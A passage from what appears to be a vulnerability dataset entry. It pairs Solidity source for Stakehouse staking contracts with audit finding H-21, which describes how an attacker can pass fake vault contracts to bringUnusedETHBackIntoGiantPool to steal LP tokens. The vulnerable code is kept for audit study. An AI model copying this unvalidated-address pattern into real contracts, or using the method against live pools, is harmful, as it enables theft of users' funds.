batchPreviewAccumulatedETH(address _user, LPToken[] calldata _token) external view returns (uint256) {\n        uint256 totalAccumulated;\n        for (uint256 i; i < _token.length; ++i) {\n            totalAccumulated += previewAccumulatedETH(_user, _token[i]);\n        }\n        return totalAccumulated;\n    }\n\n    /// @notice Preview total ETH accumulated by a staking funds LP token holder associated with a KNOT that has minted derivatives\n    function previewAccumulatedETH(address _user, LPToken _token) public view returns (uint256) {\n        // if token maps to BLS public key that has not been minted derivatives then return zero as it's not eligible\n        bytes memory associatedBLSPublicKeyOfLpToken = KnotAssociatedWithLPToken[_token];\n        if (getAccountManager().blsPublicKeyToLifecycleStatus(associatedBLSPublicKeyOfLpToken) != IDataStructures.LifecycleStatus.TOKENS_MINTED) {\n            return 0;\n        }\n\n        // Looking at this contract balance and the ETH that is yet to be transferred from the syndicate, then tell the user how much ETH they have earned\n        address payable syndicate = payable(liquidStakingNetworkManager.syndicate());\n        return _previewAccumulatedETH(\n            _user,\n            address(_token),\n            _token.balanceOf(_user),\n            totalShares,\n            Syndicate(syndicate).previewUnclaimedETHAsFreeFloatingStaker(\n                address(this),\n                associatedBLSPublicKeyOfLpToken\n            )\n        );\n    }\n\n    /// @notice before an LP token is transferred, pay the user any unclaimed ETH rewards\n    function beforeTokenTransfer(address _from, address _to, uint256) external override {\n        address syndicate = liquidStakingNetworkManager.syndicate();\n        if (syndicate != address(0)) {\n            LPToken token = LPToken(msg.sender);\n            bytes memory blsPubKey = KnotAssociatedWithLPToken[token];\n            require(blsPubKey.length > 0, \"Invalid token\");\n\n            if (getAccountManager().blsPublicKeyToLifecycleStatus(blsPubKey) == IDataStructures.LifecycleStatus.TOKENS_MINTED) {\n                // Claim any ETH for the BLS key mapped to this token\n                bytes[] memory keys = new bytes[](1);\n                keys[0] = blsPubKey;\n                _claimFundsFromSyndicateForDistribution(syndicate, keys);\n\n                // Update the accumulated ETH per minted derivative LP share\n                updateAccumulatedETHPerLP();\n\n                // distribute any due rewards for the `from` user\n                if (_from != address(0)) {\n                    _distributeETHRewardsToUserForToken(_from, address(token), token.balanceOf(_from), _from);\n                }\n\n                // in case the new user has existing rewards - give it to them so that the after transfer hook does not wipe pending rewards\n                _distributeETHRewardsToUserForToken(_to, address(token), token.balanceOf(_to), _to);\n            }\n        }\n    }\n\n    /// @notice After an LP token is transferred, ensure that the new account cannot claim historical rewards\n    function afterTokenTransfer(address, address _to, uint256) external override {\n        if (LiquidStakingManager(payable(liquidStakingNetworkManager)).syndicate() != address(0)) {\n            LPToken token = LPToken(msg.sender);\n            require(KnotAssociatedWithLPToken[token].length > 0, \"Invalid token\");\n\n            // claim is calculated on full balance not amount being transferred so that double claims are not possible\n            claimed[_to][address(token)] = (token.balanceOf(_to) * accumulatedETHPerLPShare) / PRECISION;\n        }\n    }\n\n    /// @notice Claim ETH to this contract from the syndicate that was accrued by a list of actively staked validators\n    /// @param _blsPubKeys List of BLS public key identifiers of validators that have sETH staked in the syndicate for the vault\n    function claimFundsFromSyndicateForDistribution(bytes[] memory _blsPubKeys) external {\n        _claimFundsFromSyndicateForDistribution(liquidStakingNetworkManager.syndicate(), _blsPubKeys);\n    }\n\n    /// @dev Claim ETH from syndicate for a list of BLS public keys for later distribution amongst LPs\n    function _claimFundsFromSyndicateForDistribution(address _syndicate, bytes[] memory _blsPubKeys) internal {\n        require(_syndicate != address(0), \"Invalid configuration\");\n\n        // Claim all of the ETH due from the syndicate for the auto-staked sETH\n        Syndicate syndicateContract = Syndicate(payable(_syndicate));\n        syndicateContract.claimAsStaker(address(this), _blsPubKeys);\n\n        updateAccumulatedETHPerLP();\n    }\n\n    /// @dev Initialization logic\n    function _init(LiquidStakingManager _liquidStakingNetworkManager, LPTokenFactory _lpTokenFactory) internal virtual {\n        require(address(_liquidStakingNetworkManager) != address(0), \"Zero Address\");\n        require(address(_lpTokenFactory) != address(0), \"Zero Address\");\n\n        liquidStakingNetworkManager = _liquidStakingNetworkManager;\n        lpTokenFactory = _lpTokenFactory;\n\n        baseLPTokenName = \"ETHLPToken_\";\n        baseLPTokenSymbol = \"ETHLP_\";\n        maxStakingAmountPerValidator = 4 ether;\n    }\n}\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nimport { Strings } from \"@openzeppelin/contracts/utils/Strings.sol\";\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\";\n\nimport { LPTokenFactory } from \"./LPTokenFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\n\n/// @dev For pools accepting ETH for validator staking, this contract will manage issuing LPs for deposits\nabstract contract ETHPoolLPFactory is StakehouseAPI {\n\n    /// @notice signalize withdrawing of ETH by depositor\n    event ETHWithdrawnByDepositor(address depositor, uint256 amount);\n\n    /// @notice signalize burning of LP token\n    event LPTokenBurnt(bytes blsPublicKeyOfKnot, address token, address depositor, uint256 amount);\n\n    /// @notice signalize issuance of new LP token\n    event NewLPTokenIssued(bytes blsPublicKeyOfKnot, address token, address firstDepositor, uint256 amount);\n\n    /// @notice signalize issuance of existing LP token\n    event LPTokenMinted(bytes blsPublicKeyOfKnot, address token, address depositor, uint256 amount);\n\n    /// @dev Base name and symbol used for deploying new LP tokens per KNOT\n    string internal baseLPTokenName;\n    string internal baseLPTokenSymbol;\n\n    /// @notice count of unique LP tokens issued for ETH deposits\n    uint256 public numberOfLPTokensIssued;\n\n    /// @notice Maximum amount that can be staked per validator in WEI\n    uint256 public maxStakingAmountPerValidator;\n\n    /// @notice Minimum amount that can be staked per validator in WEI\n    uint256 public constant MIN_STAKING_AMOUNT = 0.001 ether;\n\n    /// @notice Factory for the deployment of KNOT<>LP Tokens that can be used to redeem dETH\n    LPTokenFactory public lpTokenFactory;\n\n    /// @notice LP token address deployed for a KNOT's BLS public key\n    mapping(bytes => LPToken) public lpTokenForKnot;\n\n    /// @notice KNOT BLS public key associated with the LP token\n    mapping(LPToken => bytes) public KnotAssociatedWithLPToken;\n\n    /// @notice Allow users to rotate the ETH from many LP to another in the event that a BLS key is never staked\n    /// @param _oldLPTokens Array of old LP tokens to be burnt\n    /// @param _newLPTokens Array of new LP tokens to be minted in exchange of old LP tokens\n    /// @param _amounts Array of amount of tokens to be exchanged\n    function batchRotateLPTokens(\n        LPToken[] calldata _oldLPTokens,\n        LPToken[] calldata _newLPTokens,\n        uint256[] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _oldLPTokens.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n\n        for (uint256 i; i < numOfRotations; ++i) {\n            rotateLPTokens(\n                _oldLPTokens[i],\n                _newLPTokens[i],\n                _amounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow users to rotate the ETH from one LP token to another in the event that the BLS key is never staked\n    /// @param _oldLPToken Instance of the old LP token (to be burnt)\n    /// @param _newLPToken Instane of the new LP token (to be minted)\n    /// @param _amount Amount of LP tokens to be rotated/converted from old to new\n    function rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public {\n        require(address(_oldLPToken) != address(0), \"Zero address\");\n        require(address(_newLPToken) != address(0), \"Zero address\");\n        require(_oldLPToken != _newLPToken, \"Incorrect rotation to same token\");\n        require(_amount >= MIN_STAKING_AMOUNT, \"Amount cannot be zero\");\n        require(_amount <= _oldLPToken.balanceOf(msg.sender), \"Not enough balance\");\n        require(_oldLPToken.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Liquidity is still fresh\");\n        require(_amount + _newLPToken.totalSupply() <= 24 ether, \"Not enough mintable tokens\");\n\n        bytes memory blsPublicKeyOfPreviousKnot = KnotAssociatedWithLPToken[_oldLPToken];\n        bytes memory blsPublicKeyOfNewKnot = KnotAssociatedWithLPToken[_newLPToken];\n\n        require(blsPublicKeyOfPreviousKnot.length == 48, \"Incorrect BLS public key\");\n        require(blsPublicKeyOfNewKnot.length == 48, \"Incorrect BLS public key\");\n\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfPreviousKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Lifecycle status must be one\"\n        );\n\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfNewKnot) ==IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Lifecycle status must be one\"\n        );\n\n        // burn old tokens and mint new ones\n        _oldLPToken.burn(msg.sender, _amount);\n        emit LPTokenBurnt(blsPublicKeyOfPreviousKnot, address(_oldLPToken), msg.sender, _amount);\n\n        _newLPToken.mint(msg.sender, _amount);\n        emit LPTokenMinted(KnotAssociatedWithLPToken[_newLPToken], address(_newLPToken), msg.sender, _amount);\n    }\n\n    /// @dev Internal business logic for processing staking deposits for single or batch deposits\n    function _depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount, bool _enableTransferHook) internal {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Min amount not reached\");\n        require(_blsPublicKeyOfKnot.length == 48, \"Invalid BLS public key\");\n\n        // LP token issued for the KNOT\n        // will be zero for a new KNOT because the mapping doesn't exist\n        LPToken lpToken = lpTokenForKnot[_blsPublicKeyOfKnot];\n        if(address(lpToken) != address(0)) {\n            // KNOT and it's LP token is already registered\n            // mint the respective LP tokens for the user\n\n            // total supply after minting the LP token must not exceed maximum staking amount per validator\n            require(lpToken.totalSupply() + _amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");\n\n            // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied\n            lpToken.mint(msg.sender, _amount);\n            emit LPTokenMinted(_blsPublicKeyOfKnot, address(lpToken), msg.sender, _amount);\n        }\n        else {\n            // check that amount doesn't exceed max staking amount per validator\n            require(_amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");\n            \n            // mint new LP tokens for the new KNOT\n            // add the KNOT in the mapping\n            string memory tokenNumber = Strings.toString(numberOfLPTokensIssued);\n            string memory tokenName = string(abi.encodePacked(baseLPTokenName, tokenNumber));\n            string memory tokenSymbol = string(abi.encodePacked(baseLPTokenSymbol, tokenNumber));\n\n            // deploy new LP token and optionally enable transfer notifications\n            LPToken newLPToken = _enableTransferHook ?\n                             LPToken(lpTokenFactory.deployLPToken(address(this), address(this), tokenSymbol, tokenName)) :\n                             LPToken(lpTokenFactory.deployLPToken(address(this), address(0), tokenSymbol, tokenName));\n\n            // increase the count of LP tokens\n            numberOfLPTokensIssued++;\n\n            // register the BLS Public Key with the LP token\n            lpTokenForKnot[_blsPublicKeyOfKnot] = newLPToken;\n            KnotAssociatedWithLPToken[newLPToken] = _blsPublicKeyOfKnot;\n\n            // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied\n            newLPToken.mint(msg.sender, _amount);\n            emit NewLPTokenIssued(_blsPublicKeyOfKnot, address(newLPToken), msg.sender, _amount);\n        }\n    }\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { StakingFundsVault } from \"./StakingFundsVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { GiantPoolBase } from \"./GiantPoolBase.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\n\n/// @notice A giant pool that can provide liquidity to any liquid staking network's staking funds vault\ncontract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, SyndicateRewardsProcessor {\n\n    constructor(LSDNFactory _factory) {\n        lpTokenETH = new GiantLP(address(this), address(this), \"GiantETHLP\", \"gMevETH\");\n        liquidStakingDerivativeFactory = _factory;\n    }\n\n    /// @notice Stake ETH against multiple BLS keys within multiple LSDNs and specify the amount of ETH being supplied for each key\n    /// @dev Uses contract balance for funding and get Staking Funds Vault LP in exchange for ETH\n    /// @param _stakingFundsVault List of mev and fees vaults being interacted with\n    /// @param _ETHTransactionAmounts ETH being attached to each savETH vault in the list\n    /// @param _blsPublicKeyOfKnots For every staking funds vault, the list of BLS keys of LSDN validators receiving funding\n    /// @param _amounts List of amounts of ETH being staked per BLS public key\n    function batchDepositETHForStaking(\n        address[] calldata _stakingFundsVault,\n        uint256[] calldata _ETHTransactionAmounts,\n        bytes[][] calldata _blsPublicKeyOfKnots,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVault.length;\n        require(numOfVaults > 0, \"Zero vaults\");\n        require(numOfVaults == _blsPublicKeyOfKnots.length, \"Inconsistent lengths\");\n        require(numOfVaults == _amounts.length, \"Inconsistent lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            // As ETH is being deployed to a staking funds vault, it is no longer idle\n            idleETH -= _ETHTransactionAmounts[i];\n\n            StakingFundsVault sfv = StakingFundsVault(payable(_stakingFundsVault[i]));\n            require(\n                liquidStakingDerivativeFactory.isLiquidStakingManager(address(sfv.liquidStakingNetworkManager())),\n                \"Invalid liquid staking manager\"\n            );\n\n            sfv.batchDepositETHForStaking{ value: _ETHTransactionAmounts[i] }(\n                _blsPublicKeyOfKnots[i],\n                _amounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow a giant LP to claim a % of the revenue received by the MEV and Fees Pool\n    function claimRewards(\n        address _recipient,\n        address[] calldata _stakingFundsVaults,\n        bytes[][] calldata _blsPublicKeysForKnots\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty array\");\n        require(numOfVaults == _blsPublicKeysForKnots.length, \"Inconsistent array lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).claimRewards(\n                address(this),\n                _blsPublicKeysForKnots[i]\n            );\n        }\n\n        updateAccumulatedETHPerLP();\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            _recipient\n        );\n    }\n\n    /// @notice Preview total ETH accumulated by an address\n    function previewAccumulatedETH(\n        address _user,\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens\n    ) external view returns (uint256) {\n        require(_stakingFundsVaults.length == _lpTokens.length, \"Inconsistent array lengths\");\n\n        uint256 accumulated;\n        for (uint256 i; i < _stakingFundsVaults.length; ++i) {\n            accumulated = StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(\n                address(this),\n                _lpTokens[i]\n            );\n        }\n\n        return _previewAccumulatedETH(_user, address(lpTokenETH), lpTokenETH.balanceOf(_user), lpTokenETH.totalSupply(), accumulated);\n    }\n\n    /// @notice Any ETH supplied to a BLS key registered with a liquid staking network can be rotated to another key if it never gets staked\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _oldLPTokens List of savETH vault LP tokens that the vault has\n    /// @param _oldLPTokens List of new savETH vault LP tokens that the vault wants to receive in exchange for moving ETH to a new KNOT\n    /// @param _amounts Amount of old being swapped for new per LP token\n    function batchRotateLPTokens(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _oldLPTokens,\n        LPToken[][] calldata _newLPTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _stakingFundsVaults.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _oldLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n        require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, \"No common interest\");\n        for (uint256 i; i < numOfRotations; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Any ETH that has not been utilized by a Staking Funds vault can be brought back into the giant pool\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a staking funds vault\n    /// @param _amounts Amounts of LP within the giant pool being burnt\n    function bringUnusedETHBackIntoGiantPool(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).burnLPTokensForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Distribute any new ETH received to LP holders\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(lpTokenETH.totalSupply());\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function beforeTokenTransfer(address _from, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        updateAccumulatedETHPerLP();\n\n        // Make sure that `_from` gets total accrued before transfer as post transferred anything owed will be wiped\n        if (_from != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                _from,\n                address(lpTokenETH),\n                lpTokenETH.balanceOf(_from),\n                _from\n            );\n        }\n\n        // Make sure that `_to` gets total accrued before transfer as post transferred anything owed will be wiped\n        _distributeETHRewardsToUserForToken(\n            _to,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(_to),\n            _to\n        );\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function afterTokenTransfer(address, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        _setClaimedToMax(_to);\n    }\n\n    /// @notice Total rewards received by this contract from the syndicate excluding idle ETH from LP depositors\n    function totalRewardsReceived() public view override returns (uint256) {\n        return address(this).balance + totalClaimed - idleETH;\n    }\n\n    /// @dev On withdrawing LP in exchange for burning giant LP, claim rewards\n    function _onWithdraw(LPToken[] calldata _lpTokens) internal override {\n        // Use the transfer hook of LPToken to trigger the claiming accrued ETH\n        for (uint256 i; i < _lpTokens.length; ++i) {\n            _lpTokens[i].transfer(address(this), _lpTokens[i].balanceOf(address(this)));\n        }\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            msg.sender\n        );\n    }\n\n    /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued\n    function _onDepositETH() internal override {\n        _setClaimedToMax(msg.sender);\n    }\n\n    /// @dev Internal re-usable method for setting claimed to max for msg.sender\n    function _setClaimedToMax(address _user) internal {\n        // New ETH stakers are not entitled to ETH earned by\n        claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;\n    }\n}\n\n",
        "CodeNames": [
            "StakingFundsVault.sol",
            "ETHPoolLPFactory.sol",
            "GiantMevAndFeesPool.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-21",
                "Location": [
                    "_amounts",
                    "bringUnusedETHBackIntoGiantPool",
                    "LPTokens",
                    "_oldLPTokens",
                    "_newLPTokens",
                    "burnLPForETH",
                    "_stakingFundsVaults",
                    "burnLPTokensForETH"
                ],
                "Type": "  bringUnusedETHBackIntoGiantPool  in  GiantMevAndFeesPool  can be used to steal  LPTokens ",
                "Description": "*Submitted by datapunk(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/366)*\n\nreal LPTokens can be transferred out of GiantMevAndFeesPool through fake _stakingFundsVaults provided by an attacker.\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126\n\n\nbringUnusedETHBackIntoGiantPool takes in _stakingFundsVaults, _oldLPTokens, _newLPTokens and rotate _amounts from old to new tokens. The tokens are thoroughly verified by burnLPForETH in ETHPoolLPFactory.<br\nHowever, theres is no checking for the validity of _stakingFundsVaults, nor the relationship between LPTokens and _stakingFundsVaults. Therefore, an attacker can create fake contracts for _stakingFundsVaults, with burnLPTokensForETH, that takes LPTokens as parameters. The msg.sender in burnLPTokensForETH is GiantMevAndFeesPool, thus the attacker can transfer LPTokens that belongs to GiantMevAndFeesPool to any addresses it controls.\n\n",
                "Repair": "\nAlways passing liquid staking manager address, checking its real and then requesting either the savETH vault or staking funds vault is a good idea to prove the validity of vaults.\n\nvince0656 (Stakehouse) confirmed(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/366#issuecomment-1329404515)\n\n\n\n*\n \n\n"
            }
        ]
    }
]